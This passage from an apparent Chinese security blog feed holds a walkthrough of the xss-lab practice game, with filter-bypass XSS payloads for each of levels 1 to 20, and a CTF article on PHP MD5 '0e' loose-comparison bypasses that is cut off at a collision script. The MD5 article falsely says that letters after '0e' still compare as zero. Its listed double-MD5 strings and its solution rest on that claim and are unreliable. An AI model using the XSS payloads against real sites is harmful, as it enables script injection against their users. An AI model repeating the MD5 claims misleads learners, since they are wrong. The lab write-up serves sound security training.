href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="7-2-题目二">          <a href="#7-2-题目二" class="heading-link"><i class="fas fa-link"></i></a>7.2 题目二</h3>      <p><span class="exturl"><a class="exturl__link" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS闯关小游戏</title>
      <link href="2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
      <url>2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="XSS闯关小游戏">          <a href="#XSS闯关小游戏" class="heading-link"><i class="fas fa-link"></i></a>XSS闯关小游戏</h1>              <h2 id="前言：">          <a href="#前言：" class="heading-link"><i class="fas fa-link"></i></a>前言：</h2>      <p>XSS的介绍：<strong><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/105343314">https://blog.csdn.net/weixin_45798017/article/details/105343314</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p>        <h2 id="准备：">          <a href="#准备：" class="heading-link"><i class="fas fa-link"></i></a>准备：</h2>      <p>在线游戏：<strong><span class="exturl"><a class="exturl__link" href="http://test.xss.tv/">http://test.xss.tv</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p><p>自己搭建：</p><p><span class="exturl"><a class="exturl__link" href="https://m.xp.cn/">下载phpstudy</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>-&gt;<span class="exturl"><a class="exturl__link" href="https://github.com/rebo-rn/xss-lab">下载xss-lab</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>-&gt;将xss-lab放到phpstudy目录下的WWW里面</p><p>打开phpstudy的apache，浏览器访问：127.0.0.1/xss-lab</p><a id="more"></a><p><strong>注意</strong>：xss最好搭建在虚拟机中，因为搭建在本机中无法利用burpsuite抓包</p>        <h2 id="游戏：">          <a href="#游戏：" class="heading-link"><i class="fas fa-link"></i></a>游戏：</h2>              <h3 id="level-1">          <a href="#level-1" class="heading-link"><i class="fas fa-link"></i></a>level 1</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/1.1.png"></p><p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-2">          <a href="#level-2" class="heading-link"><i class="fas fa-link"></i></a>level 2</h3>      <p>尝试level 1的方法，不行，F12查看源代码，发现方框里的被“ ”当作字符串了</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2.1.png"></p><p>想办法把value后面的“过滤掉，或者闭合</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br><span class="line">或者  &quot;onclick&#x3D;alert()&gt;    需要点击一下输入框。</span><br><span class="line">或者  &quot;onmouseover&#x3D;alert()&gt;需要要鼠标滑过输入框</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2.2.png"></p>        <h3 id="level-3">          <a href="#level-3" class="heading-link"><i class="fas fa-link"></i></a>level 3</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/3.1.png"></p><p>同样的直接输入payload执行语句会被当做value的字符串，用”闭合，然后无法执行</p><p>查看php中的源代码，显示value最后的是 ‘ 结尾的</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/3.2.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;    &#x2F;&#x2F;可以从这个看到value值也被实体化，value的值执行了htmlspecialchars($str)函数，它的作用是把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体，所以不能使用尖括号</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/3.3.png"></p><p>但是htmlspecialchars默认配置是不过滤单引号。只有设置了：quotestyle选项为ENT_QUOTES，才可以；那么可以用单引号闭合并且不能包含&lt;&gt;则</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;onclick&#x3D;alert()&#x2F;&#x2F;    &#x2F;&#x2F;是把后面的语句注释了</span><br><span class="line">或者 &#39;onmouseover&#x3D;alert()&#x2F;&#x2F;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-4">          <a href="#level-4" class="heading-link"><i class="fas fa-link"></i></a>level 4</h3>      <p>level 4和level 3原理类似</p><p>只是value后面以双引号结束，同时发生了替换函数</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/4.1.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/4.2.png"></p><p>将输入的&lt;和&gt;替换过滤了</p><p>可以利用和level 3类似的方法</p><p>执行payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick&#x3D;alert()&#x2F;&#x2F;</span><br><span class="line">或者&quot;onmouseover&#x3D;alert()&#x2F;&#x2F;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-5">          <a href="#level-5" class="heading-link"><i class="fas fa-link"></i></a>level 5</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/5.1.png"></p><p>查看源码，发现执行了两个替换函数，将script和on都替换了，所以script和onclick还有onmouseover的标签都没法使用。</p><p>尝试执行a的标签</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascript:alert()&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/5.2.png"></p>        <h3 id="level-6">          <a href="#level-6" class="heading-link"><i class="fas fa-link"></i></a>level 6</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/6.1.png"></p><p>过滤了script，on，src，data，href，但由于是用str_replace函数来过滤的，所以可以用大小写绕过</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a Href&#x3D;javascript:alert()&gt;test&lt;&#x2F;a&gt;</span><br><span class="line">或者&quot;&gt;&lt;Script&gt;alert()&lt;&#x2F;Script&gt;</span><br><span class="line">或者&quot;Onclick&#x3D;alert()&gt;</span><br><span class="line">或者&quot;Onmouseover&#x3D;alert()&gt;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-7">          <a href="#level-7" class="heading-link"><i class="fas fa-link"></i></a>level 7</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/7.1.png"></p><p>很显然，过滤了script，on，src，data，href，尝试通过重叠拼写进行绕过注入</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hhrefref&#x3D;javasscriptcript:alert()&gt;test&lt;&#x2F;a&gt;</span><br><span class="line">或者&quot;&gt;&lt;sscriptcript&gt;alert()&lt;&#x2F;sscriptcript&gt;</span><br><span class="line">或者&quot;oonnclick&#x3D;alert()&gt;</span><br><span class="line">或者&quot;oonnmouseover&#x3D;alert()&gt;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-8">          <a href="#level-8" class="heading-link"><i class="fas fa-link"></i></a>level 8</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/8.1.png"></p><p>随便输入数值，F12查看源码，可以看出下面的href友情链接显示的为输入的值，那么直接用javascript的标签</p><p>但是，</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/8.2.png"></p><p>很显然过滤了script，on，src，data，href还有双引号，尝试利用html编码绕过</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/8.3.png"></p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#112;t:alert()</span><br></pre></td></tr></table></div></figure>        <h3 id="level-9">          <a href="#level-9" class="heading-link"><i class="fas fa-link"></i></a>level 9</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/9.1.png"></p><p>很显然过滤了script，on，src，data，href还有双引号，同时对value的值进行了htmlspecialchars($str)函数的转换，上题相似</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/9.2.png"></p><p>同时，多了一个url检测，如果发现没有带http:// 内容则会显示不合法， 那么怎么可以既有它，又不让它执行呢?只需填加个注释，（可选择多行注释和单行注释）包含http://就行了</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#112;t:alert()&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-10">          <a href="#level-10" class="heading-link"><i class="fas fa-link"></i></a>level 10</h3>      <p>F12查看网页源代码，同时查看php中的源代码</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/10.1.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/10.2.png"></p><p>可以看出有三个参数的属性是hidden，同时t_sort是传参的</p><p>所以构建payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?t_sort&#x3D;&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br><span class="line">或者 ?t_sort&#x3D;&quot; onclick&#x3D;alert() type&#x3D;&quot;text&quot;</span><br><span class="line">或者直接在上面的url栏的最后添加&amp;t_sort&#x3D;&quot; onclick&#x3D;alert() type&#x3D;&quot;text&quot;（或者button属性的）</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/10.3.png"></p>        <h3 id="level-11">          <a href="#level-11" class="heading-link"><i class="fas fa-link"></i></a>level 11</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/11.1.png"></p><p>分析源码可得知t_ref字段是http referer的值，根据http_referer 参数想到了HTTP头，那么我们可以在请求头进行XSS注入，这一关很显然注入点在Referer所以可以利用burpsuite抓包修改Referer的值(hackbar没有成功)</p><p>修改前：</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/11.2.png"></p><p>修改后：</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/11.3.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/11.4.png"></p>        <h3 id="level-12">          <a href="#level-12" class="heading-link"><i class="fas fa-link"></i></a>level 12</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/12.1.png"></p><p>根据HTTP_USER_AGENT参数还是想到了HTTP请求头中的user-agent，那么，同理可以按照第十一关的方法来做:</p><p>这里直接利用hackbar就成功了</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br><span class="line">或者 &quot; onclick&#x3D;alert() type&#x3D;&quot;text&quot;</span><br><span class="line">onclick换成onmouseover都可以</span><br></pre></td></tr></table></div></figure><p>或者burpsuite抓包修改</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/12.2.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/12.3.png"></p>        <h3 id="level-13">          <a href="#level-13" class="heading-link"><i class="fas fa-link"></i></a>level 13</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/13.1.png"></p><p>和上面的方法类似，只不过这里变成了cookie了，hackbar没法用，所以用burpsuite</p><p>payload和上面的一样</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/13.2.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/13.3.png"></p>        <h3 id="level-14">          <a href="#level-14" class="heading-link"><i class="fas fa-link"></i></a>level 14</h3>      <p>由于exifviewer现在不支持上传了，这个漏洞是以前该网站存在的一个漏洞，现在也已经无法复现了</p>        <h3 id="level-15">          <a href="#level-15" class="heading-link"><i class="fas fa-link"></i></a>level 15</h3>      <p>查看源码</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/15.1.png"></p><p>注意到了ng-include，ng-include相当于php的include函数，然后src参数被转义了，最终我们<br>可以include leve1然后再用img标签传xss</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/15.2.png"></p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url栏最后添加</span><br><span class="line">?src&#x3D;&#39;level1.php?name&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert()&gt;&#39;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-16">          <a href="#level-16" class="heading-link"><i class="fas fa-link"></i></a>level 16</h3>      <p>查看源码</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/16.1.png"></p><p>输入的东西经过了大小写的转换并且通过四次的替换检查，分别对script，空格，/，进行了替换，但是有一点很重要，尖括号没有被替换，这给我们留下很大的利用空间。</p><p>另外script被替代，我们可以使用img标签，剩下我们就需要考虑如何把空格的影响给去掉，这时候就需要使用url编码来进行绕过了，可以选择<code>%0d</code> <code>%0a</code> （表会回车换行）进行绕过，构造出最后的payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&lt;img%0dsrc&#x3D;1%0donclick&#x3D;alert()&gt;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/16.2.png"></p>        <h3 id="level-17">          <a href="#level-17" class="heading-link"><i class="fas fa-link"></i></a>level 17</h3>      <p>这关做了个寂寞，点击直接进入下一关了</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/17.1.png"></p>        <h3 id="level-18">          <a href="#level-18" class="heading-link"><i class="fas fa-link"></i></a>level 18</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/18.1.png"></p><p>有两个get类型的参数，可以直接构建payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%20onmouseover&#x3D;alert()      &#x2F;&#x2F;%20是空格</span><br><span class="line">或者直接在url后面添加%20onmouseover&#x3D;alert()</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/18.2.png"></p>        <h3 id="level-19">          <a href="#level-19" class="heading-link"><i class="fas fa-link"></i></a>level 19</h3>      <p>查看源码</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.1.png"></p><p>flash xss，需要对flash的反编译对源码进行分析，这里使用<span class="exturl"><a class="exturl__link" href="https://github.com/jindrapetrik/jpexs-decompiler">jpexs-decompiler</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>来分析，首先定位getURL函数</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.2.png"></p><p>然后追踪到sIFR的内容</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.3.png"></p><p>得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL只在内容为link时打开，所以分析contentIsLink函数</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.4.png"></p><p>所以我们可以构造<a> </a> 标签来传值，构建payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;version&amp;arg02&#x3D;&lt;a%20href&#x3D;&quot;javascript:alert()&quot;&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.5.png"></p>        <h3 id="level-20">          <a href="#level-20" class="heading-link"><i class="fas fa-link"></i></a>level 20</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/20.1.png"></p><p>将xsf04.swf文件分析得知分析得知是zeroclipboard.swf</p><p>这一题用到了zeroclipboard xss，具体可以参考这篇文章：<br><span class="exturl"><a class="exturl__link" href="https://www.freebuf.com/sectool/108568.html">https://www.freebuf.com/sectool/108568.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>国内广泛使用了zeroclipboard.swf，主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上</p><p>看一下源码：<br>使用jpexs反编译(swf反编译工具：<span class="exturl"><a class="exturl__link" href="https://github.com/jindrapetrik/jpexs-decompiler">https://github.com/jindrapetrik/jpexs-decompiler</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>)<br>原因显而易见，Externalinterface.call第二个参数传回来的id没有正确过滤导致xss</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/20.2.png"></p><p>构建payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;id&amp;arg02&#x3D;\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a&#x3D;!alert(1)&#x2F;&#x2F;%26width%26height</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/20.3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5绕过</title>
      <link href="2020/08/27/MD5%E7%BB%95%E8%BF%87/"/>
      <url>2020/08/27/MD5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h3 id="0X00-摘要">          <a href="#0X00-摘要" class="heading-link"><i class="fas fa-link"></i></a>0X00 摘要</h3>      <p>CTF中md5判等可使用0e绕过，但是如果是双md5该如何绕过呢？本文将教你如何绕过md5(md5($_GET[‘a’])) == md5($_GET[b’])。</p>        <h3 id="0X01-引言">          <a href="#0X01-引言" class="heading-link"><i class="fas fa-link"></i></a>0X01 引言</h3>      <a id="more"></a><p>在php中，所有变量都是若类型的，在使用if判等的时候要格外小心，使用特殊的参数可能会使本来不相等的if判断位相等，比如下面的例子。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123;</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line">if ($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)) &#123;</span><br><span class="line">echo &quot;flag&#123;XXXXX&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &#39;wrong!&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>上面只要传入参数a=s1885207154a，b=s1836677006a，即可，为什么呢？看一下这两个字符串的md5值可以返现分别如下：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MD5值：</span><br><span class="line"></span><br><span class="line">md5(&quot;s1885207154a&quot;) &#x3D;&gt; 0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">md5(&quot;s1836677006a&quot;) &#x3D;&gt; 0e481036490867661113260034900752</span><br></pre></td></tr></table></div></figure><p>二者都是0e开头，在php中0e会被当做科学计数法，就算后面有字母，其结果也是0，所以上面的if判断结果使true，成功绕过！</p>        <h3 id="0x02-双MD5碰撞绕过">          <a href="#0x02-双MD5碰撞绕过" class="heading-link"><i class="fas fa-link"></i></a>0x02 双MD5碰撞绕过</h3>      <p>上面只是小试牛刀，下面看一个升级版：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123;</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line">if ($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5(md5($b)) &#123;</span><br><span class="line">echo &quot;flag&#123;XXXXX&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &#39;wrong!&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>双面的判断出现了md5(md5($b)，有了前面的铺垫，这里我们第一感觉就是找到一个字符串其MD5值的MD5仍然是0e开头的那就好了。开始的时候我不敢相信，那几率得多小啊，但是在昨天做一道md5截断碰撞的时候我就来了灵感，何不尝试一下，结果发现原来这种字符串使真的存在，并且碰撞0e开头的时候不到一秒钟就能碰撞到。各位观众，下面请看：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MD5值：</span><br><span class="line"></span><br><span class="line">md5(&quot;V5VDSHva7fjyJoJ33IQl&quot;) &#x3D;&gt; 0e18bb6e1d5c2e19b63898aeed6b37ea</span><br><span class="line"></span><br><span class="line">md5(&quot;0e18bb6e1************&quot;) &#x3D;&gt; 0e0a710a092113dd5ec9dd47d4d7b86f</span><br></pre></td></tr></table></div></figure><p>原来真的存在0e开头的MD5值其md5结果也是0e开头，所以此题答案便出来了。a=s1885207154a，b=V5VDSHva7fjyJoJ33IQl即可绕过if判断。 </p><p>其实上面的这种双md5值0e开头的字符串有很多，但是网上似乎很见到，几乎没有，下面发布一些： </p>        <h3 id="0x03-双md5结果仍为0e开头字符串大全">          <a href="#0x03-双md5结果仍为0e开头字符串大全" class="heading-link"><i class="fas fa-link"></i></a>0x03 双md5结果仍为0e开头字符串大全</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MD5大全：</span><br><span class="line"></span><br><span class="line">1. CbDLytmyGm2xQyaLNhWn</span><br><span class="line"></span><br><span class="line">md5(CbDLytmyGm2xQyaLNhWn) &#x3D;&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line"></span><br><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) &#x3D;&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line"></span><br><span class="line">2. 770hQgrBOjrcqftrlaZk</span><br><span class="line"></span><br><span class="line">md5(770hQgrBOjrcqftrlaZk) &#x3D;&gt; 0e689b4f703bdc753be7e27b45cb3625</span><br><span class="line"></span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) &#x3D;&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line"></span><br><span class="line">3. 7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line"></span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) &#x3D;&gt; 0e269ab12da27d79a6626d91f34ae849</span><br><span class="line"></span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) &#x3D;&gt; 0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></div></figure>        <h3 id="0x04-MD5碰撞脚本">          <a href="#0x04-MD5碰撞脚本" class="heading-link"><i class="fas fa-link"></i></a>0x04 MD5碰撞脚本</h3>      <p> 授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。</p><figure class="highlight plain"><div class="table-container"><table><tr><td 